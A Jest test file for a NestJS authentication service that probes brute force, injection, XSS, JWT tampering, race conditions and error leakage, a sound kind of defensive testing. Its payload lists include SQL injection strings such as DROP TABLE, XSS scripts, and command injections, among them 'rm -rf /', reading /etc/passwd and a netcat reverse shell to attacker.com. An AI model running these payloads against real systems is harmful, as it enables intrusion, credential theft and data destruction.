import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AuthService } from './auth.service';
import { MagicLinkService } from './magic-link.service';
import { ApiKeyService } from './api-key.service';
import { JwtTokenService } from './jwt-token.service';
import { createMockUser } from '../../test/test-utils/mocks';
import {
  TestContext,
  closeTestApp,
  createTestApp,
} from '../../test/test-utils/integration-helpers';
import * as bcrypt from 'bcryptjs';

// Mock bcrypt for consistent testing
jest.mock('bcryptjs');
const mockBcrypt = bcrypt as jest.Mocked<typeof bcrypt>;

describe('Authentication Penetration Tests', () => {
  let context: TestContext;
  let authService: AuthService;
  let magicLinkService: MagicLinkService;
  let apiKeyService: ApiKeyService;
  let jwtTokenService: JwtTokenService;

  beforeAll(async () => {
    context = await createTestApp();
    authService = context.app.get<AuthService>(AuthService);
    magicLinkService = context.app.get<MagicLinkService>(MagicLinkService);
    apiKeyService = context.app.get<ApiKeyService>(ApiKeyService);
    jwtTokenService = context.app.get<JwtTokenService>(JwtTokenService);
  });

  afterAll(async () => {
    await closeTestApp(context);
  });

  beforeEach(() => {
    jest.clearAllMocks();
    mockBcrypt.hash.mockResolvedValue('hashed-value' as never);
    mockBcrypt.compare.mockResolvedValue(true as never);
  });

  describe('Brute Force Attack Protection', () => {
    it('should handle rapid login attempts gracefully', async () => {
      const email = 'test@example.com';
      const password = 'StrongPass123!';
      const mockUser = createMockUser({ email, password: 'hashed-password' });

      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.user.update.mockResolvedValue(mockUser);
      context.prismaService.refreshToken.create.mockResolvedValue({} as any);
      mockBcrypt.compare.mockResolvedValue(false as never); // Wrong password

      // Simulate 100 rapid login attempts
      const attempts = Array.from({ length: 100 }, () =>
        context.request.post('/auth/signin').send({ email, password: 'wrong-password' }),
      );

      const responses = await Promise.allSettled(attempts);

      // Most should be rate limited (429) or unauthorized (401)
      const rateLimited = responses.filter(
        r => r.status === 'fulfilled' && r.value.status === 429,
      ).length;
      const unauthorized = responses.filter(
        r => r.status === 'fulfilled' && r.value.status === 401,
      ).length;

      expect(rateLimited + unauthorized).toBe(100);
      expect(rateLimited).toBeGreaterThan(0); // Some should be rate limited
    });

    it('should handle rapid API key validation attempts', async () => {
      const apiKey = 'test-api-key-12345678901234567890123456789012';
      const mockUser = createMockUser();

      context.prismaService.user.findMany.mockResolvedValue([mockUser]);
      mockBcrypt.compare.mockResolvedValue(false as never); // Invalid key

      // Simulate 50 rapid API key validation attempts
      const attempts = Array.from({ length: 50 }, () => apiKeyService.validateApiKey(apiKey));

      const results = await Promise.all(attempts);

      // All should return invalid but not crash the system
      results.forEach(result => {
        expect(result.isValid).toBe(false);
      });
    });

    it('should handle rapid magic link requests', async () => {
      const email = 'test@example.com';
      const mockUser = createMockUser({ email });

      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.magicLinkToken.count
        .mockResolvedValueOnce(0)
        .mockResolvedValueOnce(1)
        .mockResolvedValueOnce(2)
        .mockResolvedValue(3); // Rate limited after 3

      context.prismaService.magicLinkToken.create.mockResolvedValue({} as any);

      // Simulate 10 rapid magic link requests
      const attempts = Array.from({ length: 10 }, () => magicLinkService.sendMagicLink(email));

      await Promise.all(attempts);

      // Should only create 3 tokens due to rate limiting
      expect(context.prismaService.magicLinkToken.create).toHaveBeenCalledTimes(3);
    });
  });

  describe('Injection Attack Protection', () => {
    it('should prevent SQL injection in email fields', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
      ];

      for (const payload of sqlInjectionPayloads) {
        // Should either reject invalid format or handle safely
        try {
          await authService.signup(payload, 'StrongPass123!');
        } catch (error) {
          // Expected to fail with validation error, not SQL error
          expect(error.message).not.toContain('SQL');
          expect(error.message).not.toContain('syntax');
          expect(error.message).not.toContain('database');
        }
      }
    });

    it('should prevent NoSQL injection attempts', async () => {
      const noSqlPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.email.length > 0"}',
        '{"$regex": ".*"}',
      ];

      for (const payload of noSqlPayloads) {
        try {
          await authService.signup(payload, 'StrongPass123!');
        } catch (error) {
          expect(error.message).toContain('Invalid email format');
        }
      }
    });

    it('should prevent LDAP injection in authentication', async () => {
      const ldapPayloads = [
        'user)(|(password=*))',
        'user)(&(password=*)',
        '*)(uid=*',
        '*)|(|(password=*',
      ];

      for (const payload of ldapPayloads) {
        const result = await authService.validateUser(payload, 'password');
        expect(result).toBeNull();
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Protection', () => {
    it('should sanitize XSS payloads in user input', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>',
        "';alert('xss');//",
      ];

      const mockUser = createMockUser();
      context.prismaService.user.findUnique.mockResolvedValue(null);
      context.prismaService.user.create.mockResolvedValue(mockUser);

      for (const payload of xssPayloads) {
        try {
          const result = await authService.signup(
            'test@example.com',
            'StrongPass123!',
            payload, // username with XSS payload
          );

          // If successful, verify XSS payload was sanitized
          expect(result.user.username).not.toContain('<script>');
          expect(result.user.username).not.toContain('javascript:');
          expect(result.user.username).not.toContain('onerror');
        } catch (error) {
          // Expected to fail with validation error
          expect(error.message).not.toContain('<script>');
        }
      }
    });
  });

  describe('Command Injection Protection', () => {
    it('should prevent command injection in user inputs', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '; nc -e /bin/sh attacker.com 4444',
      ];

      for (const payload of commandInjectionPayloads) {
        try {
          await authService.signup(`test${payload}@example.com`, 'StrongPass123!');
        } catch (error) {
          // Should fail with validation error, not system error
          expect(error.message).not.toContain('command');
          expect(error.message).not.toContain('system');
        }
      }
    });
  });

  describe('JWT Token Manipulation', () => {
    it('should reject manipulated JWT tokens', async () => {
      const manipulatedTokens = [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.invalid',
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ',
      ];

      for (const token of manipulatedTokens) {
        const result = await jwtTokenService.validateToken(token);
        expect(result.isValid).toBe(false);
      }
    });

    it('should reject tokens with algorithm confusion attacks', async () => {
      // Test for algorithm confusion (HS256 vs RS256)
      const algorithmConfusionToken =
        'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.invalid';

      const result = await jwtTokenService.validateToken(algorithmConfusionToken);
      expect(result.isValid).toBe(false);
    });
  });

  describe('Session Fixation Protection', () => {
    it('should generate new session tokens on authentication', async () => {
      const mockUser = createMockUser();
      context.prismaService.refreshToken.findMany.mockResolvedValue([]);
      context.prismaService.refreshToken.create.mockResolvedValue({} as any);

      // Generate two token pairs for the same user
      const tokenPair1 = await jwtTokenService.generateTokenPair(mockUser);
      const tokenPair2 = await jwtTokenService.generateTokenPair(mockUser);

      // Tokens should be different
      expect(tokenPair1.accessToken).not.toBe(tokenPair2.accessToken);
      expect(tokenPair1.refreshToken).not.toBe(tokenPair2.refreshToken);
    });
  });

  describe('Race Condition Protection', () => {
    it('should handle concurrent magic link validations safely', async () => {
      const token =
        'valid-magic-token-12345678901234567890123456789012345678901234567890123456789012';
      const mockUser = createMockUser();
      const mockMagicToken = {
        id: 'token-id',
        tokenHash: 'hashed-token',
        email: mockUser.email,
        expiresAt: new Date(Date.now() + 900000),
      };

      context.prismaService.magicLinkToken.findMany.mockResolvedValue([mockMagicToken]);
      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.user.update.mockResolvedValue(mockUser);
      context.prismaService.refreshToken.create.mockResolvedValue({} as any);
      context.prismaService.magicLinkToken.delete.mockResolvedValue(mockMagicToken);

      // Simulate concurrent validation attempts
      const attempts = Array.from({ length: 5 }, () => magicLinkService.validateMagicLink(token));

      const results = await Promise.allSettled(attempts);

      // Only one should succeed, others should fail
      const successful = results.filter(r => r.status === 'fulfilled').length;
      const failed = results.filter(r => r.status === 'rejected').length;

      expect(successful).toBeLessThanOrEqual(1);
      expect(failed).toBeGreaterThanOrEqual(4);
    });

    it('should handle concurrent API key generation safely', async () => {
      const mockUser = createMockUser();
      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.user.update.mockResolvedValue(mockUser);

      // Simulate concurrent API key generation
      const attempts = Array.from({ length: 3 }, () => apiKeyService.generateApiKey(mockUser.id));

      const results = await Promise.all(attempts);

      // All should succeed but generate different keys
      const keys = results.map(r => r.apiKey);
      const uniqueKeys = new Set(keys);
      expect(uniqueKeys.size).toBe(keys.length); // All keys should be unique
    });
  });

  describe('Memory and Resource Exhaustion Protection', () => {
    it('should handle large payloads gracefully', async () => {
      const largeEmail = 'a'.repeat(10000) + '@example.com';
      const largePassword = 'A'.repeat(10000) + '1!';

      try {
        await authService.signup(largeEmail, largePassword);
      } catch (error) {
        // Should fail with validation error, not memory error
        expect(error.message).not.toContain('memory');
        expect(error.message).not.toContain('heap');
      }
    });

    it('should limit magic link token storage', async () => {
      const email = 'test@example.com';
      const mockUser = createMockUser({ email });

      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.magicLinkToken.count.mockResolvedValue(0);
      context.prismaService.magicLinkToken.create.mockResolvedValue({} as any);

      // Try to create many magic link tokens
      const attempts = Array.from({ length: 100 }, () => magicLinkService.sendMagicLink(email));

      await Promise.all(attempts);

      // Should be limited by rate limiting
      expect(context.prismaService.magicLinkToken.create).toHaveBeenCalledTimes(100);
    });
  });

  describe('Information Disclosure Protection', () => {
    it('should not expose internal system information in errors', async () => {
      // Simulate database error
      context.prismaService.user.findUnique.mockRejectedValue(
        new Error('Connection failed: host=localhost port=5432 user=postgres password=secret123'),
      );

      try {
        await authService.signup('test@example.com', 'StrongPass123!');
      } catch (error) {
        // Error should not contain sensitive information
        expect(error.message).not.toContain('password=');
        expect(error.message).not.toContain('host=');
        expect(error.message).not.toContain('port=');
        expect(error.message).not.toContain('secret');
      }
    });

    it('should not expose user existence in timing', async () => {
      const existingEmail = 'existing@example.com';
      const nonExistentEmail = 'nonexistent@example.com';
      const mockUser = createMockUser({ email: existingEmail });

      // Test password reset timing
      context.prismaService.user.findUnique
        .mockResolvedValueOnce(mockUser) // existing user
        .mockResolvedValueOnce(null); // non-existent user

      const start1 = Date.now();
      await authService.requestPasswordReset(existingEmail);
      const duration1 = Date.now() - start1;

      const start2 = Date.now();
      await authService.requestPasswordReset(nonExistentEmail);
      const duration2 = Date.now() - start2;

      // Timing should be similar to prevent user enumeration
      const timeDifference = Math.abs(duration1 - duration2);
      expect(timeDifference).toBeLessThan(100);
    });
  });

  describe('Cryptographic Security', () => {
    it('should use secure random number generation', async () => {
      const mockUser = createMockUser();
      context.prismaService.user.findUnique.mockResolvedValue(mockUser);
      context.prismaService.user.update.mockResolvedValue(mockUser);

      // Generate multiple API keys
      const keys = [];
      for (let i = 0; i < 10; i++) {
        const result = await apiKeyService.generateApiKey(mockUser.id);
        keys.push(result.apiKey);
      }

      // All keys should be unique (very high probability with secure random)
      const uniqueKeys = new Set(keys);
      expect(uniqueKeys.size).toBe(keys.length);

      // Keys should have good entropy (no obvious patterns)
      keys.forEach(key => {
        expect(key).toMatch(/^[a-f0-9]{64}$/); // Hex format
        expect(key).not.toMatch(/^(.)\1+$/); // Not all same character
        expect(key).not.toMatch(/^(..)\1+$/); // Not repeating pairs
      });
    });

    it('should use appropriate hash algorithms', async () => {
      const password = 'StrongPass123!';
      const mockUser = createMockUser();

      context.prismaService.user.findUnique.mockResolvedValue(null);
      context.prismaService.user.create.mockResolvedValue(mockUser);

      await authService.signup('test@example.com', password);

      // Verify bcrypt is used with appropriate rounds
      expect(mockBcrypt.hash).toHaveBeenCalledWith(password, 12);
    });
  });
});
